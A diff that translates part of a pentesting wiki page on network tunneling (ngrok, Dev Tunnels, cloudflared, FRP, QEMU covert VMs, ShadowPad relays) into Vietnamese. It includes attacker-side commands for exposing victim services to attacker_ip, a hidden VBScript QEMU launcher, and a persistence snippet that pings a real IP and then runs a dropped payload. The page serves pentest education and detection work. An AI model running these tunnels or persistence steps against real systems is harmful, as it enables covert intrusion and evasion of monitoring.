+_Hữu ích cho XSS,SSRF,SSTI ..._\
+Theo mặc định, standalone agent cung cấp giao diện kiểm tra HTTP tại `http://127.0.0.1:4040`; giao diện này dành cho lưu lượng HTTP.<sup>[[40]](#references)</sup>
 
-#### Tunneling internal HTTP service
+#### Tunneling dịch vụ HTTP nội bộ
 
-The `--host-header=rewrite` option rewrites the upstream HTTP `Host` header to match the local service.<sup>[[41]](#references)</sup>
+Tùy chọn `--host-header=rewrite` viết lại header HTTP `Host` upstream để khớp với dịch vụ cục bộ.<sup>[[41]](#references)</sup>
 
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
@@ -818,12 +818,12 @@ The `--host-header=rewrite` option rewrites the upstream HTTP `Host` header to m
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
 
-#### ngrok.yaml simple configuration example
+#### Ví dụ cấu hình ngrok.yaml đơn giản
 
-This uses ngrok Agent Config v2; named tunnels use `proto` and `addr` and are started with `ngrok start`.<sup>[[42]](#references)</sup> It opens 3 tunnels:
+Ví dụ này sử dụng ngrok Agent Config v2; tunnel có tên dùng `proto` và `addr`, và được khởi chạy bằng `ngrok start`.<sup>[[42]](#references)</sup> Cấu hình này mở 3 tunnel:
 
 - 2 TCP
-- 1 HTTP with static files exposition from /tmp/httpbin/
+- 1 HTTP với nội dung phục vụ file tĩnh từ /tmp/httpbin/
 
 ```yaml
 version: 2
@@ -841,7 +841,7 @@ tunnels:
 
 ## Microsoft Dev Tunnels
 
-Microsoft Dev Tunnels can publish a local TCP-backed service through Microsoft relay infrastructure. The host CLI creates an outbound tunnel, while `devtunnel connect` recreates the hosted port on the client; tunnels require authentication by default unless access controls are deliberately relaxed.<sup>[[55]](#references)[[58]](#references)</sup>
+Microsoft Dev Tunnels có thể xuất bản một dịch vụ cục bộ chạy trên TCP thông qua hạ tầng relay của Microsoft. CLI trên máy chủ tạo một tunnel đi ra, trong khi `devtunnel connect` tái tạo cổng được host trên máy khách; theo mặc định, tunnel yêu cầu xác thực, trừ khi các biện pháp kiểm soát truy cập được nới lỏng có chủ đích.<sup>[[55]](#references)[[58]](#references)</sup>
 
 ```bash
 # Compromised/pivot host: publish its local RDP service
@@ -854,15 +854,15 @@ devtunnel connect <TUNNEL_ID>
 xfreerdp /u:<USER> /v:127.0.0.1:3389
 ```
 
-This can expose RDP through `*.devtunnels.ms` without opening a new inbound listener on the perimeter. It can also be layered with an RDP virtual-channel tunnel such as `rdp2tcp`, turning the RDP session into a second-stage pivot for arbitrary TCP traffic.<sup>[[58]](#references)</sup>
+Điều này có thể công khai RDP qua `*.devtunnels.ms` mà không cần mở listener inbound mới ở ranh giới mạng. Cách này cũng có thể kết hợp với một đường hầm kênh ảo RDP như `rdp2tcp`, biến phiên RDP thành pivot giai đoạn hai cho lưu lượng TCP tùy ý.<sup>[[58]](#references)</sup>
 
-For hunting, correlate execution of the Dev Tunnels CLI with DNS/TLS traffic to `*.devtunnels.ms` and unexpected RDP virtual-channel events. An authenticated tunnel is not benign merely because it uses a Microsoft-owned relay.<sup>[[58]](#references)</sup>
+Để săn tìm, hãy đối chiếu việc thực thi Dev Tunnels CLI với lưu lượng DNS/TLS đến `*.devtunnels.ms` và các sự kiện kênh ảo RDP bất thường. Một đường hầm đã xác thực không mặc nhiên là vô hại chỉ vì nó sử dụng relay thuộc Microsoft.<sup>[[58]](#references)</sup>
 
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare Tunnel's `cloudflared` connector establishes outbound connections; published applications can route HTTP, HTTPS, TCP, SSH, and RDP, while quick tunnels are intended for HTTP development.<sup>[[43]](#references)[[45]](#references)</sup>
+Connector `cloudflared` của Cloudflare Tunnel thiết lập các kết nối outbound; các ứng dụng được công khai có thể định tuyến HTTP, HTTPS, TCP, SSH và RDP, trong khi quick tunnel được thiết kế cho việc phát triển qua HTTP.<sup>[[43]](#references)[[45]](#references)</sup>
 
-### Quick tunnel one-liner
+### Lệnh một dòng cho quick tunnel
 
 ```bash
 # Expose a local web service listening on 8080
@@ -870,18 +870,18 @@ cloudflared tunnel --url http://localhost:8080
 # => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
 ```
 
-### SOCKS5 origin (legacy mode)
+### SOCKS5 origin (chế độ legacy)
 
-The legacy `--socks5` flag tells `cloudflared` that the local origin speaks SOCKS5; it does not create a local SOCKS5 listener. For a managed tunnel, `originRequest.proxyType: socks` configures SOCKS5 origin handling.<sup>[[44]](#references)</sup>
+Cờ legacy `--socks5` cho `cloudflared` biết rằng origin cục bộ sử dụng SOCKS5; cờ này không tạo listener SOCKS5 cục bộ. Với managed tunnel, `originRequest.proxyType: socks` cấu hình cách xử lý origin SOCKS5.<sup>[[44]](#references)</sup>
 
 ```bash
 # Expose a local SOCKS5-speaking origin (legacy syntax)
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 ```
 
-### Persistent tunnels with DNS
+### Tunnel bền vững qua DNS
 
-Locally managed tunnel configuration uses lower-case `tunnel`, `credentials-file`, and `url` keys as shown below.<sup>[[46]](#references)</sup>
+Cấu hình tunnel được quản lý cục bộ sử dụng các khóa `tunnel`, `credentials-file` và `url` viết thường như bên dưới.<sup>[[46]](#references)</sup>
 
 ```bash
 cloudflared tunnel create mytunnel
@@ -892,19 +892,19 @@ credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
 
-Start the connector:
+Khởi động connector:
 
 ```bash
 cloudflared tunnel run mytunnel
 ```
 
-The connector establishes outbound connections and, by default, negotiates QUIC with fallback to HTTP/2; do not assume every deployment uses TCP/443. Run it with only the privileges required by your deployment.<sup>[[43]](#references)[[47]](#references)</sup>
+Connector thiết lập các kết nối đi ra và theo mặc định thương lượng QUIC, dự phòng sang HTTP/2; đừng cho rằng mọi triển khai đều dùng TCP/443. Chỉ chạy connector với các quyền cần thiết cho triển khai của bạn.<sup>[[43]](#references)[[47]](#references)</sup>
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) is a Go reverse proxy supporting **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, and XTCP**. XTCP uses P2P hole punching whose success depends on NAT. Starting with **v0.53.0** it can act as an **SSH Tunnel Gateway**, so a target host can use the stock OpenSSH client without an `frpc` binary.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
+[`frp`](https://github.com/fatedier/frp) là một reverse proxy viết bằng Go, hỗ trợ **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX và XTCP**. XTCP sử dụng kỹ thuật hole punching P2P, với khả năng thành công phụ thuộc vào NAT. Bắt đầu từ **v0.53.0**, công cụ này có thể hoạt động như một **SSH Tunnel Gateway**, cho phép máy chủ đích sử dụng client OpenSSH có sẵn mà không cần binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
 
-### Classic reverse TCP tunnel
+### Đường hầm TCP ngược cổ điển
 
 ```bash
 # Attacker / server
@@ -925,7 +925,7 @@ localPort  = 3389
 remotePort = 5000
 ```
 
-### Using the new SSH gateway (no frpc binary)
+### Sử dụng gateway SSH mới (không có binary frpc)
 
 ```bash
 # On frps (attacker)
@@ -936,19 +936,19 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
 
-The above command publishes the victim's port **8080** as **attacker_ip:9000** using the stock OpenSSH client while `frps` provides the gateway.<sup>[[50]](#references)</sup>
+Lệnh trên công khai cổng **8080** của nạn nhân dưới dạng **attacker_ip:9000** bằng OpenSSH client có sẵn, trong khi `frps` cung cấp gateway.<sup>[[50]](#references)</sup>
 
-## STUN-assisted UDP back-connects
+## Kết nối ngược UDP có STUN hỗ trợ
 
-STUN Binding requests sent from a UDP socket can reveal its server-reflexive IP address and port, while periodic traffic keeps the NAT binding alive. A public STUN server is not a relay for arbitrary control packets.<sup>[[60]](#references)</sup> An analyzed back-connect design retained the same UDP socket for a short control datagram, then used a *separate outbound TCP connection* to fetch and execute commands after the trigger arrived.<sup>[[59]](#references)</sup>
+Các yêu cầu STUN Binding được gửi từ socket UDP có thể tiết lộ địa chỉ IP và cổng server-reflexive của socket đó, trong khi lưu lượng định kỳ giúp duy trì binding NAT. Máy chủ STUN công khai không phải là relay cho các gói điều khiển tùy ý.<sup>[[60]](#references)</sup> Một thiết kế back-connect được phân tích đã giữ nguyên socket UDP đó để gửi một datagram điều khiển ngắn, sau đó dùng *một kết nối TCP outbound riêng* để tải và thực thi các lệnh sau khi nhận được trigger.<sup>[[59]](#references)</sup>
 
-To receive the controller's UDP packet, a design still needs to share the mapping with that controller and satisfy the NAT's filtering policy. Address- or port-dependent filtering may accept replies from the STUN server but drop packets from another endpoint.<sup>[[60]](#references)[[61]](#references)</sup> The analyzed backdoor's rendezvous path was not verified, so successful STUN replies alone do not prove that its control channel is reachable.<sup>[[59]](#references)</sup> For a separate protocol with explicit rendezvous and relay fallback, see [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).
+Để nhận gói UDP từ controller, thiết kế vẫn cần chia sẻ mapping với controller đó và đáp ứng chính sách filtering của NAT. Filtering phụ thuộc vào địa chỉ hoặc cổng có thể chấp nhận các phản hồi từ máy chủ STUN nhưng loại bỏ các gói từ endpoint khác.<sup>[[60]](#references)[[61]](#references)</sup> Đường rendezvous của backdoor được phân tích chưa được xác minh, nên chỉ riêng việc nhận được phản hồi STUN không chứng minh rằng kênh điều khiển có thể truy cập được.<sup>[[59]](#references)</sup> Để xem một giao thức riêng có rendezvous tường minh và phương án dự phòng relay, hãy xem [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).
 
-## Covert VM-based Tunnels with QEMU
+## Tunnel ẩn dựa trên VM với QEMU
 
-QEMU user-mode networking does not require root or administrator privilege for the virtual network, and `-netdev user,hostfwd=...` redirects TCP, UDP, or UNIX connections from the host to the guest.<sup>[[51]](#references)</sup> TrustedSec documented a Tiny Core QEMU VM and an attempted reverse SSH tunnel in an incident where host-focused EDR could miss activity inside the guest.<sup>[[1]](#references)</sup>
+QEMU user-mode networking không yêu cầu quyền root hoặc administrator đối với mạng ảo, và `-netdev user,hostfwd=...` chuyển tiếp các kết nối TCP, UDP hoặc UNIX từ host đến guest.<sup>[[51]](#references)</sup> TrustedSec đã ghi lại một VM Tiny Core QEMU và một nỗ lực tạo reverse SSH tunnel trong một sự cố mà EDR tập trung vào host có thể bỏ sót hoạt động bên trong guest.<sup>[[1]](#references)</sup>
 
-### Quick one-liner
+### Lệnh một dòng nhanh
 
 ```powershell
 # Windows victim (user-mode networking; no TAP driver is needed for this example)
@@ -960,13 +960,13 @@ qemu-system-x86_64.exe ^
    -nographic
 ```
 
-• The command above launches a **Tiny Core Linux** guest with 256 MiB of guest memory and a qcow2 disk image; the disk image is not an in-RAM disk.
-• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.  
-• From the attacker’s point of view the target simply exposes port 2222; any packets that reach it are handled by the SSH server running in the VM.
+• Lệnh ở trên khởi chạy một máy ảo **Tiny Core Linux** với 256 MiB bộ nhớ và một ảnh đĩa qcow2; ảnh đĩa không phải là đĩa trong RAM.
+• Cổng **2222/tcp** trên máy chủ Windows được chuyển tiếp trong suốt đến **22/tcp** bên trong máy ảo.
+• Từ góc nhìn của attacker, mục tiêu chỉ đơn giản là mở cổng 2222; mọi gói tin đến cổng này đều được máy chủ SSH đang chạy trong VM xử lý.
 
-### Launching stealthily through VBScript
+### Khởi chạy âm thầm thông qua VBScript
 
-TrustedSec observed VBS-driven QEMU launches and Tiny Core images in the incident cited above.<sup>[[1]](#references)</sup>
+TrustedSec đã quan sát thấy các lần khởi chạy QEMU được điều khiển bằng VBS và các ảnh Tiny Core trong sự cố được trích dẫn ở trên.<sup>[[1]](#references)</sup>
 
 ```vb
 ' update.vbs – lived in C:\ProgramData\update
@@ -974,42 +974,42 @@ Set o = CreateObject("Wscript.Shell")
 o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
 ```
 
-Running the script with `cscript.exe //B update.vbs` keeps the window hidden.<sup>[[1]](#references)</sup>
+Chạy script bằng `cscript.exe //B update.vbs` sẽ giữ cửa sổ ẩn.<sup>[[1]](#references)</sup>
 
-### In-guest persistence
+### Persistence trong guest
 
-The cited incident describes persistence in the stateless Tiny Core guest through `/opt/bootlocal.sh` and `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
+Sự cố được trích dẫn mô tả cách duy trì persistence trong guest Tiny Core không trạng thái thông qua `/opt/bootlocal.sh` và `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
 
-1. Drop payload to `/opt/123.out`  
-2. Append to `/opt/bootlocal.sh`:
+1. Thả payload vào `/opt/123.out`  
+2. Thêm vào cuối `/opt/bootlocal.sh`:
 
    ```sh
    while ! ping -c1 45.77.4.101; do sleep 2; done
    /opt/123.out
    ```
 
-3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.
+3. Thêm `home/tc` và `opt` vào `/opt/filetool.lst` để payload được đóng gói vào `mydata.tgz` khi tắt máy.
 
-### Telemetry considerations
+### Các cân nhắc về telemetry
 
-• The host still exposes the QEMU process, qcow2 image, and any host-forwarded listener.
-• Host-only process scans may not inspect guest processes, but virtualization is not guaranteed evasion; network, QEMU, and image telemetry can still expose it.<sup>[[1]](#references)[[51]](#references)</sup>
+• Host vẫn để lộ tiến trình QEMU, ảnh qcow2 và mọi listener được forward từ host.  
+• Quét tiến trình chỉ trên host có thể không kiểm tra các tiến trình trong guest, nhưng ảo hóa không đảm bảo né tránh bị phát hiện; telemetry mạng, QEMU và ảnh đĩa vẫn có thể làm lộ hoạt động này.<sup>[[1]](#references)[[51]](#references)</sup>
 
-### Defender tips
+### Mẹo cho Defender
 
-• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
-• Block outbound connections that originate from `qemu-system*.exe`.  
-• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.
+• Cảnh báo khi phát hiện **binary QEMU/VirtualBox/KVM không mong đợi** trong các đường dẫn mà người dùng có quyền ghi.  
+• Chặn các kết nối outbound bắt nguồn từ `qemu-system*.exe`.  
+• Tìm các cổng listening hiếm gặp (2222, 10022, …) được bind ngay sau khi QEMU khởi chạy.
 
-## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)
+## Các relay node IIS/HTTP.sys qua `HttpAddUrl` (ShadowPad)
 
-Check Point describes ShadowPad's IIS module as turning compromised perimeter web servers into backdoor and relay nodes by binding URL prefixes through `HttpAddUrl`.<sup>[[3]](#references)</sup>
+Check Point mô tả module IIS của ShadowPad biến các web server biên bị xâm nhập thành backdoor và relay node bằng cách bind các tiền tố URL thông qua `HttpAddUrl`.<sup>[[3]](#references)</sup>
 
-The same report details the defaults, wildcard listeners, packet decryption, relay queues, and debug telemetry summarized below.<sup>[[3]](#references)</sup>
+Báo cáo tương tự trình bày chi tiết các giá trị mặc định, wildcard listener, giải mã packet, hàng đợi relay và telemetry debug được tóm tắt bên dưới.<sup>[[3]](#references)</sup>
 
-* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.
-* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler; nonmatching requests fall back to normal IIS behavior.
-* **Encrypted first packet** – the first two bytes of the request body carry the seed for a custom 32-bit PRNG. Every subsequent byte is XOR-ed with the generated keystream before protocol parsing:
+* **Cấu hình mặc định** – nếu JSON config của module bỏ qua các giá trị, module sẽ dùng các giá trị mặc định IIS trông có vẻ hợp lý (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Nhờ vậy, IIS phản hồi lưu lượng bình thường với nhận diện thương hiệu chính xác.
+* **Chặn bắt wildcard** – operator cung cấp danh sách tiền tố URL phân tách bằng dấu chấm phẩy (wildcard trong host + path). Module gọi `HttpAddUrl` cho từng mục, để HTTP.sys định tuyến các request khớp đến handler độc hại; request không khớp sẽ chuyển về hành vi IIS bình thường.
+* **Packet đầu tiên được mã hóa** – hai byte đầu tiên của request body chứa seed cho PRNG 32-bit tùy chỉnh. Mỗi byte tiếp theo được XOR với keystream được tạo ra trước khi phân tích protocol:
 
   ```python
   def decrypt_first_packet(buf):
@@ -1023,80 +1023,79 @@ The same report details the defaults, wildcard listeners, packet decryption, rel
       return out
   ```
 
-* **Relay orchestration** – the module maintains two lists: “servers” (upstream nodes) and “clients” (downstream implants). Entries are pruned if no heartbeat arrives within ~30 seconds. When both lists are non-empty, it pairs the first healthy server with the first healthy client and simply pipes bytes between their sockets until one side closes.
-* **Debug telemetry** – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims.
+* **Điều phối relay** – module duy trì hai danh sách: “servers” (nút upstream) và “clients” (implant downstream). Các mục sẽ bị loại nếu không nhận được heartbeat trong khoảng 30 giây. Khi cả hai danh sách đều không rỗng, module ghép server khỏe mạnh đầu tiên với client khỏe mạnh đầu tiên, rồi truyền trực tiếp các byte giữa socket của chúng cho đến khi một bên đóng kết nối.
+* **Telemetry gỡ lỗi** – tính năng ghi log tùy chọn lưu lại IP nguồn, IP đích và tổng số byte được chuyển tiếp cho mỗi cặp kết nối. Các nhà điều tra đã dùng những dấu vết này để dựng lại mạng lưới ShadowPad trải rộng qua nhiều nạn nhân.
 
 ---
 
-## Other tools to check
+## Các công cụ khác cần kiểm tra
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 ## References
 
-- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
-- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
-- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
-- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
-- [5] [Nmap Reference Guide: Bypass Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
-- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
-- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
-- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
-- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
-- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
-- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
-- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
+- [1] [Ẩn mình trong bóng tối: Tunnel bí mật qua ảo hóa QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [2] [Check Point Research – Trước ToolShell: Khám phá các chiến dịch ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [3] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng lưới relay và hoạt động nội bộ của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [4] [README của Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
+- [5] [Hướng dẫn tham khảo Nmap: Vượt qua các hạn chế của Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
+- [6] [Hướng dẫn sử dụng ssh của OpenBSD](https://man.openbsd.org/ssh)
+- [7] [Hướng dẫn sử dụng sshd_config của OpenBSD](https://man.openbsd.org/sshd_config)
+- [8] [Ghi chú phát hành OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
+- [9] [README của sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
+- [10] [Metasploit: Pivoting trong Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+- [11] [Tài liệu module socks_proxy của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
+- [12] [Tài liệu module autoroute của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
 - [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
 - [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
-- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
-- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
-- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
-- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
-- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
-- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
-- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
-- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
-- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
-- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
-- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
-- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
-- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
-- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
+- [15] [README của reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
+- [16] [README của Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
+- [17] [Hướng dẫn bắt đầu nhanh của Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
+- [18] [Listeners của Ligolo-ng](https://docs.ligolo.ng/Listeners/)
+- [19] [Localhost của Ligolo-ng](https://docs.ligolo.ng/Localhost/)
+- [20] [README của rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
+- [21] [Hướng dẫn sử dụng socat](https://man7.org/linux/man-pages/man1/socat.1.html)
+- [22] [Hướng dẫn sử dụng PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
+- [23] [Các tùy chọn dòng lệnh của PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
+- [24] [Lệnh netsh interface portproxy của Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
+- [25] [README của SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
+- [26] [Tài liệu Proxifier](https://www.proxifier.com/docs/win-v4/)
+- [27] [Quy tắc Proxification của Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
+- [28] [Hướng dẫn sử dụng OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
 - [29] [Cntlm](https://cntlm.sourceforge.net/)
-- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
-- [31] [iodine README](https://code.kryo.se/iodine/README.html)
-- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
-- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
-- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
+- [30] [README của YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
+- [31] [README của iodine](https://code.kryo.se/iodine/README.html)
+- [32] [README của dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
+- [33] [README của dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
+- [34] [README của proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
 - [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
-- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
+- [36] [RFC 1035: Tên miền - Triển khai và đặc tả](https://www.rfc-editor.org/rfc/rfc1035)
 - [37] [Hans](https://code.gerade.org/hans/)
-- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
-- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
-- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
-- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
-- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
-- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
-- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
-- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
-- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
-- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
-- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
-- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
-- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
-- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
-- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
-- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
-- [54] [BOFScale: A CDN-Fronted Tailnet from a BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
-- [55] [Microsoft Learn - Dev Tunnels CLI commands](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
+- [38] [README của ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
+- [39] [Giao diện dòng lệnh của ngrok Agent](https://ngrok.com/docs/agent/cli)
+- [40] [Giao diện kiểm tra web của ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
+- [41] [Virtual host của ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
+- [42] [Cấu hình v2 của ngrok Agent](https://ngrok.com/docs/agent/config/v2)
+- [43] [Tổng quan về Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
+- [44] [Tham số origin của Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
+- [45] [Thiết lập Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
+- [46] [Tệp cấu hình Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
+- [47] [Tham số chạy Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
+- [48] [Các khái niệm về frp](https://gofrp.org/en/docs/concepts/)
+- [49] [XTCP của frp](https://gofrp.org/en/docs/features/xtcp/)
+- [50] [Cổng SSH Tunnel của frp](https://gofrp.org/en/docs/features/common/ssh/)
+- [51] [Tài liệu về mạng của QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
+- [52] [README của wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
+- [53] [Kho mã nguồn BOFScale của NetSPI](https://github.com/NetSPI/BOFscale)
+- [54] [BOFScale: Tailnet được định tuyến qua CDN từ BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
+- [55] [Microsoft Learn - Các lệnh CLI của Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
 - [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
 - [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
-- [58] [NightEagle APT: GhostContainer and Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
